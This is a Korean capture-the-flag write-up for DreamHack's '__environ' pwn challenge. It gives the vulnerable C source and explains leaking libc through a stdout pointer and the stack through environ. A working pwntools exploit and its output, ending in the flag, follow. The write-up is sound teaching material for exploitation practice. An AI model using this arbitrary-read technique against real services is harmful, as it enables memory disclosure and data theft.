# [DreamHack] __environ

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: __environ에서 실습하는 문제입니다.
>
> Release: [__environ.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8540019/__environ.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/161372976-b816c88d-2b23-4b6a-b9c3-e87a32a3a701.png)

## Analysis

```c
void read_file() {
  char file_buf[4096];

  int fd = open("/home/environ_exercise/flag", O_RDONLY);
  read(fd, file_buf, sizeof(file_buf) - 1);
  close(fd);
}
```

`read_file()` 함수는 플래그 파일의 내용을 읽어와서 스택의 `file_buf`에 저장한다.

```c
int main() {
  char buf[1024];
  long addr;
  int idx;

  init();
  read_file();

  printf("stdout: %p\n", stdout);

  while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("Addr: ");
        scanf("%ld", &addr);
        printf("%s", (char *)addr);
        break;
      default:
        break;
    }
  }
  return 0;
}
```

`stdout`의 값을 leak해준다. 이를 이용하여 libc 주소를 계산할 수 있다. AAR이 제한 없이 가능하므로, 먼저 `environ`을 leak해서 스택 주소를 알아낸 후, `file_buf`에 저장된 플래그를 읽어오면 된다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('/home/environ_exercise/environ_exercise')
    stdout_offset = 0x3ec760
    environ_offset = 0x61c118
else:
    r = remote('host1.dreamhack.games', 13219)
    stdout_offset = 0x3ec760
    environ_offset = 0x61c118

sla = r.sendlineafter


# leak libc

r.recvuntil('stdout: 0x')
stdout = int(r.recvline()[:-1], 16)  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
environ = libc + environ_offset  # environ


# leak stack

sla('> ', '1')
sla('Addr: ', str(environ))

stack = u64(r.recvn(6).ljust(8, b'\x00'))
flag = stack - 0x1538


# read flag

sla('> ', '1')
sla('Addr: ', str(flag))


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 13219: Done
[*] Switching to interactive mode
DH{d27721f1c8dd19d57e67f64cda6c7bca}
```